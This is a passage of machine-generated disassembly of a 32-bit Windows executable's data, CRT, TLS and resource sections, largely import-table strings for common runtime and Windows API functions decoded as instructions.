  4116cd:	add    edx,DWORD PTR [ecx+0x75]
  4116d0:	gs jb  0x41174c
  4116d3:	push   eax
  4116d4:	gs jb  0x41173d
  4116d7:	outs   dx,DWORD PTR ds:[esi]
  4116d8:	jb     0x411747
  4116da:	popa   
  4116db:	outs   dx,BYTE PTR ds:[esi]
  4116dc:	arpl   WORD PTR [ebp+0x43],sp
  4116df:	outs   dx,DWORD PTR ds:[esi]
  4116e0:	jne    0x411750
  4116e2:	je     0x411749
  4116e4:	jb     0x4116e6
  4116e6:	sbb    al,0x4
  4116e8:	push   ebx
  4116e9:	gs je  0x411731
  4116ec:	jb     0x411760
  4116ee:	outs   dx,DWORD PTR ds:[esi]
  4116ef:	jb     0x41173e
  4116f1:	outs   dx,DWORD PTR ds:[esi]
  4116f2:	fs add BYTE PTR gs:[eax],al
  4116f6:	addr16 add al,0x53
  4116f9:	gs je  0x411751
  4116fc:	outs   dx,BYTE PTR ds:[esi]
  4116fd:	push   0x6c646e61
  411702:	gs fs inc ebp
  411705:	js     0x41176a
  411707:	gs jo  0x41177e
  41170a:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  411711:	gs jb  0x411714
  411714:	je     0x41171a
  411716:	push   ebx
  411717:	ins    BYTE PTR es:[edi],dx
  411718:	gs gs jo 0x41171c
  41171c:	add    BYTE PTR [esp+edx*2],0x65
  411720:	jb     0x41178f
  411722:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  411729:	outs   dx,DWORD PTR ds:[esi]
  41172a:	arpl   WORD PTR [ebp+0x73],sp
  41172d:	jae    0x41172f
  41172f:	add    BYTE PTR [ecx+0x736c5404],cl
  411735:	inc    edi
  411736:	gs je  0x41178f
  411739:	popa   
  41173a:	ins    BYTE PTR es:[edi],dx
  41173b:	jne    0x4117a2
  41173d:	add    BYTE PTR [esi+0x686e5504],dl
  411743:	popa   
  411744:	outs   dx,BYTE PTR ds:[esi]
  411745:	fs ins BYTE PTR es:[edi],dx
  411747:	gs fs inc ebp
  41174a:	js     0x4117af
  41174c:	gs jo  0x4117c3
  41174f:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  411756:	gs jb  0x411759
  411759:	add    BYTE PTR [esi+0x72695604],dh
  41175f:	je     0x4117d6
  411761:	popa   
  411762:	ins    BYTE PTR es:[edi],dx
  411763:	push   eax
  411764:	jb     0x4117d5
  411766:	je     0x4117cd
  411768:	arpl   WORD PTR [eax+eax*1+0x0],si
  41176c:	mov    ecx,0x72695604
  411771:	je     0x4117e8
  411773:	popa   
  411774:	ins    BYTE PTR es:[edi],dx
  411775:	push   ecx
  411776:	jne    0x4117dd
  411778:	jb     0x4117f3
  41177a:	add    BYTE PTR [eax],al
  41177c:	fiadd  DWORD PTR [edi+edx*2]
  41177f:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  411787:	outs   dx,DWORD PTR ds:[esi]
  411788:	dec    ebp
  411789:	jne    0x4117f7
  41178b:	je     0x4117f6
  41178d:	inc    edx
  41178e:	jns    0x411804
  411790:	add    BYTE PTR gs:[edi],dh
  411793:	add    BYTE PTR [edi+0x5f],bl
  411796:	fs ins BYTE PTR es:[edi],dx
  411798:	ins    BYTE PTR es:[edi],dx
  411799:	outs   dx,DWORD PTR ds:[esi]
  41179a:	outs   dx,BYTE PTR ds:[esi]
  41179b:	gs js  0x411807
  41179e:	je     0x4117a0
  4117a0:	cmp    al,BYTE PTR [eax]
  4117a2:	pop    edi
  4117a3:	pop    edi
  4117a4:	addr16 gs je 0x411815
  4117a8:	popa   
  4117a9:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  4117b0:	cmp    eax,DWORD PTR [eax]
  4117b2:	pop    edi
  4117b3:	pop    edi
  4117b4:	imul   ebp,DWORD PTR [esi+0x69],0x766e6574
  4117bb:	add    BYTE PTR [eax+eax*1+0x5f],al
  4117bf:	pop    edi
  4117c0:	ins    BYTE PTR es:[edi],dx
  4117c1:	arpl   WORD PTR [edi+0x6e],bp
  4117c4:	jbe    0x411825
  4117c6:	imul   ebp,DWORD PTR [esi+0x69],0x45000074
  4117cd:	add    BYTE PTR [edi+0x5f],bl
  4117d0:	ins    DWORD PTR es:[edi],dx
  4117d1:	bound  ebx,QWORD PTR [edi+0x63]
  4117d4:	jne    0x411848
  4117d6:	pop    edi
  4117d7:	ins    DWORD PTR es:[edi],dx
  4117d8:	popa   
  4117d9:	js     0x4117db
  4117db:	add    BYTE PTR [eax+0x0],ch
  4117de:	pop    edi
  4117df:	pop    edi
  4117e0:	jae    0x411847
  4117e2:	je     0x411843
  4117e4:	popa   
  4117e5:	jo     0x411857
  4117e7:	pop    edi
  4117e8:	je     0x411863
  4117ea:	jo     0x411851
  4117ec:	add    BYTE PTR [eax],al
  4117ee:	imul   eax,DWORD PTR [eax],0x5f
  4117f1:	pop    edi
  4117f2:	jae    0x411859
  4117f4:	je     0x41186b
  4117f6:	jae    0x41185d
  4117f8:	jb     0x411867
  4117fa:	popa   
  4117fb:	je     0x411865
  4117fd:	gs jb  0x411872
  411800:	add    BYTE PTR [eax],al
  411802:	jns    0x411804
  411804:	pop    edi
  411805:	popa   
  411806:	arpl   WORD PTR [ebp+0x64],bp
  411809:	ins    BYTE PTR es:[edi],dx
  41180a:	outs   dx,BYTE PTR ds:[esi]
  41180b:	add    BYTE PTR [esi+0x6d615f00],cl
  411811:	jae    0x41187a
  411813:	pop    edi
  411814:	gs js  0x411880
  411817:	je     0x411819
  411819:	add    BYTE PTR [edi+0x65635f00],bl
  41181f:	js     0x41188a
  411821:	je     0x411823
  411823:	add    al,dl
  411825:	add    BYTE PTR [edi+0x65],bl
  411828:	jb     0x41189c
  41182a:	outs   dx,BYTE PTR ds:[esi]
  41182b:	outs   dx,DWORD PTR ds:[esi]
  41182c:	add    BYTE PTR [eax],al
  41182e:	repz add BYTE PTR [edi+0x66],bl
  411832:	ins    DWORD PTR es:[edi],dx
  411833:	outs   dx,DWORD PTR ds:[esi]
  411834:	fs add BYTE PTR gs:[eax],al
  411838:	das    
  411839:	add    DWORD PTR [edi+0x69],ebx
  41183c:	outs   dx,BYTE PTR ds:[esi]
  41183d:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  411845:	add    DWORD PTR [edi+0x69],ebx
  411848:	outs   dx,DWORD PTR ds:[esi]
  411849:	bound  eax,QWORD PTR [eax]
  41184b:	add    BYTE PTR [ecx+eax*1+0x636f6c5f],dl
  411852:	imul   eax,DWORD PTR [eax],0x31
  411855:	add    bl,BYTE PTR [edi+0x6f]
  411858:	outs   dx,BYTE PTR ds:[esi]
  411859:	gs js  0x4118c5
  41185c:	je     0x41185e
  41185e:	push   0x65735f02
  411863:	je     0x4118d2
  411865:	outs   dx,DWORD PTR ds:[esi]
  411866:	fs add BYTE PTR gs:[eax],al
  41186a:	jne    0x41186e
  41186c:	pop    edi
  41186d:	jae    0x4118dd
  41186f:	ja     0x4118e1
  411871:	jb     0x4118dc
  411873:	outs   dx,BYTE PTR ds:[esi]
  411874:	je     0x4118dc
  411876:	add    BYTE PTR [eax],al
  411878:	sbb    DWORD PTR [ebx],eax
  41187a:	arpl   WORD PTR [ecx+0x6c],sp
  41187d:	ins    BYTE PTR es:[edi],dx
  41187e:	outs   dx,DWORD PTR ds:[esi]
  41187f:	arpl   WORD PTR [eax],ax
  411881:	add    BYTE PTR [ebx],ah
  411883:	add    esp,DWORD PTR [ebp+0x78]
  411886:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x63660326
  41188e:	ins    BYTE PTR es:[edi],dx
  41188f:	outs   dx,DWORD PTR ds:[esi]
  411890:	jae    0x4118f7
  411892:	add    BYTE PTR [eax],al
  411894:	sub    DWORD PTR [ebx],eax
  411896:	data16 data16 ins BYTE PTR es:[edi],dx
  411899:	jne    0x41190e
  41189b:	push   0x3330000
  4118a0:	data16 jo 0x411915
  4118a3:	imul   ebp,DWORD PTR [esi+0x74],0x3350066
  4118aa:	data16 jo 0x411922
  4118ad:	je     0x411912
  4118af:	add    BYTE PTR [edi],dh
  4118b1:	add    esp,DWORD PTR [esi+0x70]
  4118b4:	jne    0x41192a
  4118b6:	ja     0x41191b
  4118b8:	add    BYTE PTR [eax],al
  4118ba:	cmp    al,BYTE PTR [ebx]
  4118bc:	data16 jb 0x411924
  4118bf:	add    BYTE PTR gs:[eax],al
  4118c2:	inc    ebp
  4118c3:	add    esp,DWORD PTR [esi+0x77]
  4118c6:	jb     0x411931
  4118c8:	je     0x41192f
  4118ca:	add    BYTE PTR [eax],al
  4118cc:	dec    edx
  4118cd:	add    esp,DWORD PTR [edi+0x65]
  4118d0:	je     0x411937
  4118d2:	outs   dx,BYTE PTR ds:[esi]
  4118d3:	jbe    0x4118d5
  4118d5:	add    BYTE PTR [ebp+0x3],ch
  4118d8:	ins    BYTE PTR es:[edi],dx
  4118d9:	outs   dx,DWORD PTR ds:[esi]
  4118da:	arpl   WORD PTR [ecx+0x6c],sp
  4118dd:	arpl   WORD PTR gs:[edi+0x6e],bp
  4118e1:	jbe    0x4118e3
  4118e3:	add    BYTE PTR [ecx+0x3],dh
  4118e6:	ins    DWORD PTR es:[edi],dx
  4118e7:	popa   
  4118e8:	ins    BYTE PTR es:[edi],dx
  4118e9:	ins    BYTE PTR es:[edi],dx
  4118ea:	outs   dx,DWORD PTR ds:[esi]
  4118eb:	arpl   WORD PTR [eax],ax
  4118ed:	add    BYTE PTR [ecx+0x3],bh
  4118f0:	ins    DWORD PTR es:[edi],dx
  4118f1:	gs ins DWORD PTR es:[edi],dx
  4118f3:	arpl   WORD PTR [eax+0x79],si
  4118f6:	add    BYTE PTR [eax],al
  4118f8:	xchg   edx,eax
  4118f9:	add    esi,DWORD PTR [ebx+0x65]
  4118fc:	je     0x41196a
  4118fe:	outs   dx,DWORD PTR ds:[esi]
  4118ff:	arpl   WORD PTR [ecx+0x6c],sp
  411902:	add    BYTE PTR gs:[ebx+eax*1+0x6e676973],dl
  41190a:	popa   
  41190b:	ins    BYTE PTR es:[edi],dx
  41190c:	add    BYTE PTR [eax],al
  41190e:	sahf   
  41190f:	add    esi,DWORD PTR [ebx+0x74]
  411912:	jb     0x411977
  411914:	push   0xa4000072
  411919:	add    esi,DWORD PTR [ebx+0x74]
  41191c:	jb     0x411983
  41191e:	jb     0x411992
  411920:	outs   dx,DWORD PTR ds:[esi]
  411921:	jb     0x411923
  411923:	add    BYTE PTR [esi+0x72747303],ah
  411929:	ins    BYTE PTR es:[edi],dx
  41192a:	outs   dx,BYTE PTR gs:[esi]
  41192c:	add    BYTE PTR [eax],al
  41192e:	test   eax,0x72747303
  411933:	outs   dx,BYTE PTR ds:[esi]
  411934:	arpl   WORD PTR [ebp+0x70],bp
  411937:	add    bl,ch
  411939:	add    ebx,DWORD PTR [edi+0x75]
  41193c:	outs   dx,BYTE PTR ds:[esi]
  41193d:	ins    BYTE PTR es:[edi],dx
  41193e:	outs   dx,DWORD PTR ds:[esi]
  41193f:	arpl   WORD PTR [ebx+0x0],bp
  411942:	or     eax,DWORD PTR [edi+ebx*2]
  411945:	ja     0x4119ad
  411947:	outs   dx,DWORD PTR ds:[esi]
  411948:	jo     0x4119af
  41194a:	outs   dx,BYTE PTR ds:[esi]
  41194b:	add    BYTE PTR ds:0x72775f04,bl
  411951:	gs ins DWORD PTR es:[edi],dx
  411953:	outs   dx,DWORD PTR ds:[esi]
  411954:	jbe    0x4119bb
  411956:	add    BYTE PTR [eax],al
  411958:	push   ds
  411959:	add    al,0x5f
  41195b:	ja     0x4119cf
  41195d:	outs   dx,BYTE PTR gs:[esi]
  41195f:	popa   
  411960:	ins    DWORD PTR es:[edi],dx
  411961:	add    BYTE PTR gs:[eax],al
  411964:	cmp    al,0x4
  411966:	popa   
  411967:	bound  ebp,QWORD PTR [edi+0x72]
  41196a:	je     0x41196c
  41196c:	inc    ebp
  41196d:	add    al,0x61
  41196f:	je     0x4119e0
  411971:	imul   eax,DWORD PTR [eax],0x76045900
  411977:	data16 jo 0x4119ec
  41197a:	imul   ebp,DWORD PTR [esi+0x74],0x66000066
  411981:	add    al,0x77
  411983:	arpl   WORD PTR [ebx+0x63],si
  411986:	popa   
  411987:	je     0x411989
  411989:	add    BYTE PTR [ecx+0x4],ch
  41198c:	ja     0x4119f1
  41198e:	jae    0x4119f3
  411990:	ins    DWORD PTR es:[edi],dx
  411991:	jo     0x411993
  411993:	add    BYTE PTR [ebx+0x4],ch
  411996:	ja     0x4119fb
  411998:	jae    0x4119fd
  41199a:	jo     0x411a15
  41199c:	add    BYTE PTR [eax],al
  41199e:	outs   dx,DWORD PTR ds:[esi]
  41199f:	add    al,0x77
  4119a1:	arpl   WORD PTR [ebx+0x6c],si
  4119a4:	outs   dx,BYTE PTR gs:[esi]
  4119a6:	add    BYTE PTR [eax],al
  4119a8:	jb     0x4119ae
  4119aa:	ja     0x411a0f
  4119ac:	jae    0x411a1c
  4119ae:	arpl   WORD PTR [ebp+0x70],bp
  4119b1:	add    ah,bl
  4119b3:	add    al,0x5f
  4119b5:	jo     0x411a2c
  4119b7:	je     0x411a1e
  4119b9:	outs   dx,BYTE PTR ds:[esi]
  4119ba:	jbe    0x4119bc
  4119bc:	add    al,0x0
  4119be:	inc    ebp
  4119bf:	outs   dx,BYTE PTR ds:[esi]
  4119c0:	jne    0x411a2f
  4119c2:	push   eax
  4119c3:	jb     0x411a34
  4119c5:	arpl   WORD PTR [ebp+0x73],sp
  4119c8:	jae    0x411a17
  4119ca:	outs   dx,DWORD PTR ds:[esi]
  4119cb:	fs jne 0x411a3a
  4119ce:	gs jae 0x4119d1
  4119d1:	add    BYTE PTR [edx],al
  4119d3:	add    BYTE PTR [ebx+0x6f],al
  4119d6:	ins    DWORD PTR es:[edi],dx
  4119d7:	ins    DWORD PTR es:[edi],dx
  4119d8:	popa   
  4119d9:	outs   dx,BYTE PTR ds:[esi]
  4119da:	fs dec esp
  4119dc:	imul   ebp,DWORD PTR [esi+0x65],0x72416f54
  4119e3:	addr16 jbe 0x411a3d
  4119e6:	add    BYTE PTR [eax],al
  4119e8:	pop    esi
  4119e9:	add    BYTE PTR [ebx+0x48],dl
  4119ec:	inc    edi
  4119ed:	gs je  0x411a36
  4119f0:	outs   dx,DWORD PTR ds:[esi]
  4119f1:	ins    BYTE PTR es:[edi],dx
  4119f2:	fs gs jb 0x411a46
  4119f6:	popa   
  4119f7:	je     0x411a61
  4119f9:	push   edi
  4119fa:	add    BYTE PTR [eax],al
  4119fc:	mov    ebx,0x73654d01
  411a01:	jae    0x411a64
  411a03:	addr16 gs inc edx
  411a06:	outs   dx,DWORD PTR ds:[esi]
  411a07:	js     0x411a60
  411a09:	add    BYTE PTR [eax],al
  411a0b:	add    BYTE PTR [eax],al
  411a0d:	adc    BYTE PTR [ecx],al
  411a0f:	add    BYTE PTR [eax],al
  411a11:	adc    BYTE PTR [ecx],al
  411a13:	add    BYTE PTR [eax],al
  411a15:	adc    BYTE PTR [ecx],al
  411a17:	add    BYTE PTR [eax],al
  411a19:	adc    BYTE PTR [ecx],al
  411a1b:	add    BYTE PTR [eax],al
  411a1d:	adc    BYTE PTR [ecx],al
  411a1f:	add    BYTE PTR [eax],al
  411a21:	adc    BYTE PTR [ecx],al
  411a23:	add    BYTE PTR [eax],al
  411a25:	adc    BYTE PTR [ecx],al
  411a27:	add    BYTE PTR [ecx+ebp*2+0x62],ch
  411a2b:	jbe    0x411a99
  411a2d:	arpl   WORD PTR [esi],bp
  411a2f:	fs ins BYTE PTR es:[edi],dx
  411a31:	ins    BYTE PTR es:[edi],dx
  411a32:	add    BYTE PTR [eax],al
  411a34:	adc    al,0x10
  411a36:	add    DWORD PTR [eax],eax
  411a38:	adc    al,0x10
  411a3a:	add    DWORD PTR [eax],eax
  411a3c:	inc    ecx
  411a3d:	inc    esp
  411a3e:	push   esi
  411a3f:	inc    ecx
  411a40:	push   eax
  411a41:	dec    ecx
  411a42:	xor    esi,DWORD PTR [edx]
  411a44:	cs fs ins BYTE PTR es:[edi],dx
  411a47:	ins    BYTE PTR es:[edi],dx
  411a48:	add    BYTE PTR [eax],al
  411a4a:	add    BYTE PTR [eax],al
  411a4c:	sub    BYTE PTR [eax],dl
  411a4e:	add    DWORD PTR [eax],eax
  411a50:	sub    BYTE PTR [eax],dl
  411a52:	add    DWORD PTR [eax],eax
  411a54:	sub    BYTE PTR [eax],dl
  411a56:	add    DWORD PTR [eax],eax
  411a58:	sub    BYTE PTR [eax],dl
  411a5a:	add    DWORD PTR [eax],eax
  411a5c:	sub    BYTE PTR [eax],dl
  411a5e:	add    DWORD PTR [eax],eax
  411a60:	sub    BYTE PTR [eax],dl
  411a62:	add    DWORD PTR [eax],eax
  411a64:	sub    BYTE PTR [eax],dl
  411a66:	add    DWORD PTR [eax],eax
  411a68:	sub    BYTE PTR [eax],dl
  411a6a:	add    DWORD PTR [eax],eax
  411a6c:	sub    BYTE PTR [eax],dl
  411a6e:	add    DWORD PTR [eax],eax
  411a70:	sub    BYTE PTR [eax],dl
  411a72:	add    DWORD PTR [eax],eax
  411a74:	sub    BYTE PTR [eax],dl
  411a76:	add    DWORD PTR [eax],eax
  411a78:	sub    BYTE PTR [eax],dl
  411a7a:	add    DWORD PTR [eax],eax
  411a7c:	sub    BYTE PTR [eax],dl
  411a7e:	add    DWORD PTR [eax],eax
  411a80:	sub    BYTE PTR [eax],dl
  411a82:	add    DWORD PTR [eax],eax
  411a84:	sub    BYTE PTR [eax],dl
  411a86:	add    DWORD PTR [eax],eax
  411a88:	sub    BYTE PTR [eax],dl
  411a8a:	add    DWORD PTR [eax],eax
  411a8c:	sub    BYTE PTR [eax],dl
  411a8e:	add    DWORD PTR [eax],eax
  411a90:	sub    BYTE PTR [eax],dl
  411a92:	add    DWORD PTR [eax],eax
  411a94:	sub    BYTE PTR [eax],dl
  411a96:	add    DWORD PTR [eax],eax
  411a98:	sub    BYTE PTR [eax],dl
  411a9a:	add    DWORD PTR [eax],eax
  411a9c:	sub    BYTE PTR [eax],dl
  411a9e:	add    DWORD PTR [eax],eax
  411aa0:	sub    BYTE PTR [eax],dl
  411aa2:	add    DWORD PTR [eax],eax
  411aa4:	sub    BYTE PTR [eax],dl
  411aa6:	add    DWORD PTR [eax],eax
  411aa8:	sub    BYTE PTR [eax],dl
  411aaa:	add    DWORD PTR [eax],eax
  411aac:	sub    BYTE PTR [eax],dl
  411aae:	add    DWORD PTR [eax],eax
  411ab0:	sub    BYTE PTR [eax],dl
  411ab2:	add    DWORD PTR [eax],eax
  411ab4:	sub    BYTE PTR [eax],dl
  411ab6:	add    DWORD PTR [eax],eax
  411ab8:	sub    BYTE PTR [eax],dl
  411aba:	add    DWORD PTR [eax],eax
  411abc:	sub    BYTE PTR [eax],dl
  411abe:	add    DWORD PTR [eax],eax
  411ac0:	sub    BYTE PTR [eax],dl
  411ac2:	add    DWORD PTR [eax],eax
  411ac4:	sub    BYTE PTR [eax],dl
  411ac6:	add    DWORD PTR [eax],eax
  411ac8:	sub    BYTE PTR [eax],dl
  411aca:	add    DWORD PTR [eax],eax
  411acc:	sub    BYTE PTR [eax],dl
  411ace:	add    DWORD PTR [eax],eax
  411ad0:	sub    BYTE PTR [eax],dl
  411ad2:	add    DWORD PTR [eax],eax
  411ad4:	sub    BYTE PTR [eax],dl
  411ad6:	add    DWORD PTR [eax],eax
  411ad8:	sub    BYTE PTR [eax],dl
  411ada:	add    DWORD PTR [eax],eax
  411adc:	sub    BYTE PTR [eax],dl
  411ade:	add    DWORD PTR [eax],eax
  411ae0:	sub    BYTE PTR [eax],dl
  411ae2:	add    DWORD PTR [eax],eax
  411ae4:	dec    ebx
  411ae5:	inc    ebp
  411ae6:	push   edx
  411ae7:	dec    esi
  411ae8:	inc    ebp
  411ae9:	dec    esp
  411aea:	xor    esi,DWORD PTR [edx]
  411aec:	cs fs ins BYTE PTR es:[edi],dx
  411aef:	ins    BYTE PTR es:[edi],dx
  411af0:	add    BYTE PTR [eax],al
  411af2:	add    BYTE PTR [eax],al
  411af4:	cmp    al,0x10
  411af6:	add    DWORD PTR [eax],eax
  411af8:	cmp    al,0x10
  411afa:	add    DWORD PTR [eax],eax
  411afc:	cmp    al,0x10
  411afe:	add    DWORD PTR [eax],eax
  411b00:	cmp    al,0x10
  411b02:	add    DWORD PTR [eax],eax
  411b04:	cmp    al,0x10
  411b06:	add    DWORD PTR [eax],eax
  411b08:	cmp    al,0x10
  411b0a:	add    DWORD PTR [eax],eax
  411b0c:	cmp    al,0x10
  411b0e:	add    DWORD PTR [eax],eax
  411b10:	cmp    al,0x10
  411b12:	add    DWORD PTR [eax],eax
  411b14:	cmp    al,0x10
  411b16:	add    DWORD PTR [eax],eax
  411b18:	cmp    al,0x10
  411b1a:	add    DWORD PTR [eax],eax
  411b1c:	cmp    al,0x10
  411b1e:	add    DWORD PTR [eax],eax
  411b20:	cmp    al,0x10
  411b22:	add    DWORD PTR [eax],eax
  411b24:	cmp    al,0x10
  411b26:	add    DWORD PTR [eax],eax
  411b28:	cmp    al,0x10
  411b2a:	add    DWORD PTR [eax],eax
  411b2c:	cmp    al,0x10
  411b2e:	add    DWORD PTR [eax],eax
  411b30:	cmp    al,0x10
  411b32:	add    DWORD PTR [eax],eax
  411b34:	cmp    al,0x10
  411b36:	add    DWORD PTR [eax],eax
  411b38:	cmp    al,0x10
  411b3a:	add    DWORD PTR [eax],eax
  411b3c:	cmp    al,0x10
  411b3e:	add    DWORD PTR [eax],eax
  411b40:	cmp    al,0x10
  411b42:	add    DWORD PTR [eax],eax
  411b44:	cmp    al,0x10
  411b46:	add    DWORD PTR [eax],eax
  411b48:	cmp    al,0x10
  411b4a:	add    DWORD PTR [eax],eax
  411b4c:	cmp    al,0x10
  411b4e:	add    DWORD PTR [eax],eax
  411b50:	cmp    al,0x10
  411b52:	add    DWORD PTR [eax],eax
  411b54:	cmp    al,0x10
  411b56:	add    DWORD PTR [eax],eax
  411b58:	cmp    al,0x10
  411b5a:	add    DWORD PTR [eax],eax
  411b5c:	cmp    al,0x10
  411b5e:	add    DWORD PTR [eax],eax
  411b60:	cmp    al,0x10
  411b62:	add    DWORD PTR [eax],eax
  411b64:	cmp    al,0x10
  411b66:	add    DWORD PTR [eax],eax
  411b68:	cmp    al,0x10
  411b6a:	add    DWORD PTR [eax],eax
  411b6c:	cmp    al,0x10
  411b6e:	add    DWORD PTR [eax],eax
  411b70:	cmp    al,0x10
  411b72:	add    DWORD PTR [eax],eax
  411b74:	cmp    al,0x10
  411b76:	add    DWORD PTR [eax],eax
  411b78:	cmp    al,0x10
  411b7a:	add    DWORD PTR [eax],eax
  411b7c:	cmp    al,0x10
  411b7e:	add    DWORD PTR [eax],eax
  411b80:	cmp    al,0x10
  411b82:	add    DWORD PTR [eax],eax
  411b84:	cmp    al,0x10
  411b86:	add    DWORD PTR [eax],eax
  411b88:	cmp    al,0x10
  411b8a:	add    DWORD PTR [eax],eax
  411b8c:	cmp    al,0x10
  411b8e:	add    DWORD PTR [eax],eax
  411b90:	cmp    al,0x10
  411b92:	add    DWORD PTR [eax],eax
  411b94:	cmp    al,0x10
  411b96:	add    DWORD PTR [eax],eax
  411b98:	cmp    al,0x10
  411b9a:	add    DWORD PTR [eax],eax
  411b9c:	cmp    al,0x10
  411b9e:	add    DWORD PTR [eax],eax
  411ba0:	cmp    al,0x10
  411ba2:	add    DWORD PTR [eax],eax
  411ba4:	cmp    al,0x10
  411ba6:	add    DWORD PTR [eax],eax
  411ba8:	cmp    al,0x10
  411baa:	add    DWORD PTR [eax],eax
  411bac:	cmp    al,0x10
  411bae:	add    DWORD PTR [eax],eax
  411bb0:	cmp    al,0x10
  411bb2:	add    DWORD PTR [eax],eax
  411bb4:	cmp    al,0x10
  411bb6:	add    DWORD PTR [eax],eax
  411bb8:	cmp    al,0x10
  411bba:	add    DWORD PTR [eax],eax
  411bbc:	ins    DWORD PTR es:[edi],dx
  411bbd:	jae    0x411c35
  411bbf:	arpl   WORD PTR [edx+0x74],si
  411bc2:	cs fs ins BYTE PTR es:[edi],dx
  411bc5:	ins    BYTE PTR es:[edi],dx
  411bc6:	add    BYTE PTR [eax],al
  411bc8:	push   eax
  411bc9:	adc    BYTE PTR [ecx],al
  411bcb:	add    BYTE PTR [eax+0x53],dl
  411bce:	inc    ecx
  411bcf:	push   eax
  411bd0:	dec    ecx
  411bd1:	cs inc esp
  411bd3:	dec    esp
  411bd4:	dec    esp
  411bd5:	add    BYTE PTR [eax],al
  411bd7:	add    BYTE PTR [eax+edx*1+0x1],ah
  411bdb:	add    BYTE PTR [eax+edx*1+0x1],ah
  411bdf:	add    BYTE PTR [ebx+0x48],dl
  411be2:	inc    ebp
  411be3:	dec    esp
  411be4:	dec    esp
  411be5:	xor    esi,DWORD PTR [edx]
  411be7:	cs inc esp
  411be9:	dec    esp
  411bea:	dec    esp
  411beb:	add    BYTE PTR [eax+0x10],bh
  411bee:	add    DWORD PTR [eax],eax
  411bf0:	push   ebp
  411bf1:	push   ebx
  411bf2:	inc    ebp
  411bf3:	push   edx
  411bf4:	xor    esi,DWORD PTR [edx]
  411bf6:	cs fs ins BYTE PTR es:[edi],dx
  411bf9:	ins    BYTE PTR es:[edi],dx
	...

Disassembly of section .CRT:

00412000 <.CRT>:
  412000:	add    BYTE PTR [eax],al
  412002:	add    BYTE PTR [eax],al
  412004:	xor    BYTE PTR [ecx],dl
  412006:	inc    eax
	...
  41200f:	add    BYTE PTR [eax],dl
  412011:	adc    BYTE PTR [eax+0x0],al
  412014:	shr    BYTE PTR [ecx],1
  412016:	inc    eax
	...
  41201f:	add    BYTE PTR [eax+0x3000402b],al
  412025:	sub    eax,DWORD PTR [eax+0x0]
	...

Disassembly of section .tls:

00413000 <.tls>:
  413000:	add    BYTE PTR [eax],al
  413002:	add    BYTE PTR [eax],al
  413004:	add    BYTE PTR [eax],dh
  413006:	inc    ecx
  413007:	add    BYTE PTR [eax+esi*1],bl
  41300a:	inc    ecx
  41300b:	add    BYTE PTR [eax-0xa],dl
  41300e:	inc    eax
  41300f:	add    BYTE PTR [eax],ah
  413011:	and    BYTE PTR [ecx+0x0],al
	...

Disassembly of section .rsrc:

00414000 <.rsrc>:
	...
  41400c:	add    BYTE PTR [eax],al
  41400e:	add    al,0x0
  414010:	add    eax,DWORD PTR [eax]
  414012:	add    BYTE PTR [eax],al
  414014:	xor    BYTE PTR [eax],al
  414016:	add    BYTE PTR [eax+0xe],al
  41401c:	add    BYTE PTR [ecx],al
  41401e:	add    BYTE PTR [eax+0x10],al
  414024:	xor    BYTE PTR [ecx],al
  414026:	add    BYTE PTR [eax+0x18],al
  41402c:	pusha  
  41402d:	add    DWORD PTR [eax],eax
  41402f:	add    BYTE PTR [eax],0x0
	...
  41403e:	push   es
  41403f:	add    BYTE PTR [ecx],al
  414041:	add    BYTE PTR [eax],al
  414043:	add    BYTE PTR [eax+0x0],dh
  414046:	add    BYTE PTR [eax+0x2],al
  41404c:	mov    BYTE PTR [eax],al
  41404e:	add    BYTE PTR [eax+0x3],al
  414054:	mov    al,ds:0x4800000
  414059:	add    BYTE PTR [eax],al
  41405b:	add    BYTE PTR [eax+0x5800000],bh
  414061:	add    BYTE PTR [eax],al
  414063:	add    al,dl
  414065:	add    BYTE PTR [eax],al
  414067:	add    BYTE PTR [esi],0x0
  41406a:	add    BYTE PTR [eax],al
  41406c:	call   0xc14071
	...
  41407d:	add    BYTE PTR [ecx],al
  41407f:	add    BYTE PTR [ecx],cl
  414081:	add    al,0x0
  414083:	add    BYTE PTR [eax+0x1],ch
	...
  414095:	add    BYTE PTR [ecx],al
  414097:	add    BYTE PTR [ecx],cl
  414099:	add    al,0x0
  41409b:	add    BYTE PTR [eax+0x1],bh
	...
  4140ad:	add    BYTE PTR [ecx],al
  4140af:	add    BYTE PTR [ecx],cl
  4140b1:	add    al,0x0
  4140b3:	add    al,cl
  4140b5:	add    DWORD PTR [eax],eax
	...
  4140c3:	add    BYTE PTR [eax],al
  4140c5:	add    BYTE PTR [ecx],al
  4140c7:	add    BYTE PTR [ecx],cl
  4140c9:	add    al,0x0
  4140cb:	add    al,bl
  4140cd:	add    DWORD PTR [eax],eax
	...
  4140db:	add    BYTE PTR [eax],al
  4140dd:	add    BYTE PTR [ecx],al
  4140df:	add    BYTE PTR [ecx],cl
  4140e1:	add    al,0x0
  4140e3:	add    al,ch
  4140e5:	add    DWORD PTR [eax],eax
	...
  4140f3:	add    BYTE PTR [eax],al
  4140f5:	add    BYTE PTR [ecx],al
  4140f7:	add    BYTE PTR [ecx],cl
  4140f9:	add    al,0x0
  4140fb:	add    al,bh
  4140fd:	add    DWORD PTR [eax],eax
	...
  41410b:	add    BYTE PTR [ecx],al
  41410d:	add    BYTE PTR [eax],al
  41410f:	add    BYTE PTR [eax+0x18800001],dl
  414115:	add    DWORD PTR [eax],eax
  414117:	add    BYTE PTR [eax],0x0
	...
  414126:	add    DWORD PTR [eax],eax
  414128:	or     DWORD PTR [eax+eax*1],eax
  41412b:	add    BYTE PTR [eax],cl
  41412d:	add    al,BYTE PTR [eax]
	...
  41413b:	add    BYTE PTR [eax],al
  41413d:	add    BYTE PTR [ecx],al
  41413f:	add    BYTE PTR [ecx],al
  414141:	add    BYTE PTR [eax],al
  414143:	add    BYTE PTR [eax+0x1],cl
  414146:	add    BYTE PTR [eax+0x0],al
	...
  414154:	add    BYTE PTR [eax],al
  414156:	add    DWORD PTR [eax],eax
  414158:	or     DWORD PTR [eax+eax*1],eax
  41415b:	add    BYTE PTR [eax],bl
  41415d:	add    al,BYTE PTR [eax]
	...
  41416b:	add    BYTE PTR [eax],al
  41416d:	add    BYTE PTR [ecx],al
  41416f:	add    BYTE PTR [ecx],al
